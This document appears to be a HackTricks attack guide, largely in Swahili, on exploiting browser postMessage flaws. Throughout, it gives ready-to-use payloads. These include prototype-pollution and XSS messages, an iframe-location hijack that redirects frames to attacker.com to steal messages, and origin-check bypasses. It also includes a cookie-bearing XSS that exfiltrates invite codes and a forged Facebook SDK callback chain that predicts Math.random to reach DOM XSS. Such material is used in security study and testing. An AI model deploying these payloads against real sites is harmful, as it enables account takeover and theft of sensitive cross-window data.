# Udhaifu za PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Tuma **PostMessage**

**PostMessage** inatumia kazi ifuatayo kutuma ujumbe:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
Katika **senario ya pili**, **ujumbe unaweza kutumwa tu kwa domain hiyo** (hata kama origin ya Window object ni tofauti).\
Ikiwa **wildcard** inatumika, **ujumbe unaweza kutumwa kwa domain yoyote**, na utatumwa kwa origin ya Window object.

### Kushambulia iframe & wildcard in **targetOrigin**

Kama ilivyoelezwa katika [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) ikiwa utapata ukurasa unaoweza **iframed** (hakuna `X-Frame-Header` protection) na ambao unakuwa **kutuma nyeti** ujumbe kupitia **postMessage** ukitumia **wildcard** (\*), unaweza **badilisha** **origin** ya **iframe** na **leak** **ujumbe nyeti** kwa domain inayodhibitiwa na wewe.\
Kumbuka kwamba ikiwa ukurasa unaweza kuiframed lakini **targetOrigin** imewekwa kuwa URL na si **wildcard**, hila hii **haitafanyi kazi**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** ni function inayotumiwa na JS kutangaza function ambayo inatarajia **`postMessages`**.\
Msimbo unaofanana na ufuatao utatumika:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note katika kesi hii jinsi **kitu cha kwanza** ambacho code inafanya ni **kuangalia origin**. Hii ni sana **muhimu** hasa ikiwa ukurasa unataka kufanya **lolote nyeti** na taarifa zilizopokelewa (kama kubadilisha password). **Kama hautaangalia origin, watakavyoshambulia wanaweza kumfanya mwathirika atume data yoyote kwa endpoints hizi** na kubadilisha passwords za waathirika (kifungu hiki ni mfano).

### Uorodheshaji

Ili **kupata event listeners** kwenye ukurasa wa sasa unaweza:

- **Tafuta** kwenye msimbo wa JS kwa `window.addEventListener` na `$(window).on` (_JQuery version_)
- **Endesha** kwenye developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Nenda kwa** _Elements --> Event Listeners_ kwenye developer tools za browser

![](<../../images/image (396).png>)

- Tumia **browser extension** kama [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) au [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Extensions hizi za browser zitakamata ujumbe wote na kuonyesha kwako.

### Origin check bypasses

- Kigezo cha **`event.isTrusted`** kinachukuliwa kuwa salama kwa kuwa hurudisha `True` tu kwa events zinazotokana na vitendo halisi vya mtumiaji. Ingawa ni ngumu kupitishwa ikiwa imetekelezwa vizuri, umuhimu wake kwenye ukaguzi wa usalama ni mkubwa.
- Matumizi ya **`indexOf()`** kwa uthibitisho wa origin katika PostMessage events yanaweza kuwa rahisi kupitishwa. Mfano unaoonyesha udhaifu huu ni:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Mbinu ya **`search()`** kutoka `String.prototype.search()` imekusudiwa kwa regular expressions, sio strings. Kupitisha chochote kisicho regexp husababisha kubadilishwa kwa implicit kwenda regex, na kutengeneza mbinu inayoweza kuwa isiyo salama. Hii ni kwa sababu katika regex, dot (.) inafanya kazi kama wildcard, ikiruhusu kupitishwa kwa validation kwa domains zilizotengenezwa kwa ustadi. Kwa mfano:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Kazi ya **`match()`**, sawa na `search()`, inashughulikia regex. Ikiwa regex imeundwa vibaya, inaweza kuwa nyeti kwa bypass.
- Kazi ya **`escapeHtml`** inalenga kusafisha inputs kwa kupanga characters kuwa escaped. Hata hivyo, haiundii object mpya iliyosafishwa bali inaandika juu properties za object iliyopo. Tabia hii inaweza kutumika vibaya. Kwa hasa, ikiwa object inaweza kudhibitiwa kwa namna kwamba property yake inayodhibitiwa haikutambui `hasOwnProperty`, `escapeHtml` haitafanya kazi kama inavyotarajiwa. Hii inaonyeshwa kwenye mifano hapa chini:

- Failure Inayotarajiwa:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Kupita escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Katika muktadha wa udhaifu huu, object ya `File` inafaa kuonekana kama inayoweza kutumiwa kwa sababu ya property yake ya `name` isiyoweza kuandikwa (read-only). Property hii, inapoitwa katika templates, haisafishwi na `escapeHtml`, na kusababisha hatari za usalama.

- `document.domain` property katika JavaScript inaweza kuwekwa na script ili kufupisha domain, kuruhusu utekelezaji mdogo wa same-origin policy ndani ya parent domain sawa.

### e.origin == window.origin bypass

Wakati wa kuingiza ukurasa wa web ndani ya **sandboxed iframe** ukitumia %%%%%%, ni muhimu kuelewa kwamba origin ya iframe itakuwa set kuwa null. Hii ni muhimu hasa wakati wa kushughulika na **sandbox attributes** na athari zao kwenye usalama na utendaji.

Kwa kueleza **`allow-popups`** katika sandbox attribute, popup yoyote iliyofunguliwa kutoka ndani ya iframe inarithi vikwazo vya sandbox za parent. Hii inamaanisha kwamba isipokuwa attribute ya **`allow-popups-to-escape-sandbox`** pia iwepo, origin ya window ya popup pia itawekwa `null`, ikilingana na origin ya iframe.

Kwa hivyo, popup inapo funguliwa chini ya masharti haya na ujumbe ukatumwa kutoka iframe kwenda popup kwa kutumia **`postMessage`**, pande zote za kutuma na kupokea zinaorigin iliyowekwa kuwa `null`. Hali hii inasababisha senario ambapo **`e.origin == window.origin`** inatathminiwa kuwa true (`null == null`), kwa sababu iframe na popup zote zinashiriki thamani ya origin ya `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Inawezekana kuangalia ikiwa ujumbe ulitoka kwenye window ile ile script inasikiliza (hasa inavutia kwa **Content Scripts from browser extensions** ili kuangalia ikiwa ujumbe ulitumwa kutoka ukurasa ule ule):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Unaweza kulazimisha **`e.source`** ya ujumbe kuwa null kwa kuunda **iframe** inayotuma **postMessage** na kufutwa mara moja.

Kwa taarifa zaidi **soma:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Ili kutekeleza mashambulizi haya kwa ufanisi utakuwa na uwezo wa **kuweka ukurasa wa tovuti wa mwathirika** ndani ya `iframe`. Lakini baadhi ya headers kama `X-Frame-Header` zinaweza **kuzuia** tabia hiyo.\
Katika hali hizo bado unaweza kutumia shambulio lisilo la siri. Unaweza kufungua tabo mpya kwa vulnerable web application na kuwasiliana nayo:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Kuiba ujumbe uliotumwa kwa iframe ya mtoto kwa kuzuia ukurasa kuu

Katika ukurasa ufuatao unaweza kuona jinsi unavyoweza kuiba **data nyeti za postmessage** zilizotumwa kwa **iframe ya mtoto** kwa **kuzuia** **ukurasa kuu** kabla ya kutuma data na kutumia **XSS kwenye iframe ya mtoto** ili **leak the data** kabla haijapokelewa:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Kuiba ujumbe kwa kubadilisha location ya iframe

Ikiwa unaweza ku-iframe ukurasa wa wavuti bila X-Frame-Header unao iframe nyingine, unaweza **kubadilisha location ya iframe ya mtoto**, hivyo ikiwa inapokea **postmessage** iliyotumwa kwa kutumia **wildcard**, mshambulizi anaweza **kubadilisha** iframe hiyo **origin** kwa kuwa ukurasa **unaodhibitiwa** naye na **kuiba** ujumbe:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage to Prototype Pollution and/or XSS

Katika matukio ambapo data inayotumwa kupitia `postMessage` inatekelezwa na JS, unaweza **iframe** **ukurasa** na **exploit** **prototype pollution/XSS** kwa kutuma exploit kupitia `postMessage`.

Baadhi ya **very good explained XSS though `postMessage`** zinaweza kupatikana katika [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Mfano wa exploit wa kutumia **Prototype Pollution and then XSS** kupitia `postMessage` kwa `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Kwa **maelezo zaidi**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Kutabiri **`Math.random()`** callback tokens katika postMessage bridges

Wakati uthibitishaji wa ujumbe unatumia “shared secret” iliyotengenezwa kwa `Math.random()` (mfano, `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) na helper ile ile pia inapatoa majina kwa plugin iframes, unaweza kupata PRNG outputs na kuunda ujumbe wa uaminifu wa bandia:

- **Leak PRNG outputs via `window.name`:** The SDK auto-names plugin iframes with `guid()`. If you control the top frame, iframe the victim page, then navigate the plugin iframe to your origin (e.g., `window.frames[0].frames[0].location='https://attacker.com'`) and read `window.frames[0].frames[0].name` to obtain a raw `Math.random()` output.
- **Force more outputs without reloads:** Baadhi ya SDK zinaonyesha njia ya reinit; katika FB SDK, kuwasha `init:post` kwa `{xfbml:1}` inalazimisha `XFBML.parse()`, inaharibu/inafanya upya plugin iframe, na inazalisha majina/mapendeleo mapya ya callback. Repeated reinit huunda idadi ya PRNG outputs kama inavyohitajika (kumbuka simu za ndani za ziada za `Math.random()` kwa callback/iframe IDs, hivyo solvers lazima waruke thamani za kati).
- **Trusted-origin delivery via parameter pollution:** If a first-party plugin endpoint reflects an unsanitized parameter into the cross-window payload (e.g., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), you can inject `&type=...&iconSVG=...` while preserving the trusted `facebook.com` origin.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` and feed several values (even non-consecutive) into a V8 `Math.random` predictor (e.g., Z3-based). Generate the next `guid()` locally to forge the expected callback token.
- **Trigger the sink:** Tayarisha data ya postMessage ili bridge iitishe `xd.mpn.setupIconIframe` na kuingiza HTML ndani ya `iconSVG` (mfano, URL-encoded `<img src=x onerror=...>`), ukifikia DOM XSS ndani ya origin inayohifadhi; kutoka hapo, iframes za same-origin (dialogs za OAuth, arbiters, nk.) zinaweza kusomwa.
- **Framing quirks help:** Mnyororo unahitaji framing. Katika baadhi ya mobile webviews, `X-Frame-Options` inaweza kushuka hadi `ALLOW-FROM` isiyoungwa mkono wakati `frame-ancestors` ipo, na vigezo vya “compat” vinaweza kulazimisha `frame-ancestors` lenye ustahimilivu, zikiruhusu channel ya upande wa `window.name`.

#### Mfano mdogo wa ujumbe uliotengenezwa kwa bandia
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Marejeo

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Ili kufanya mazoezi: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
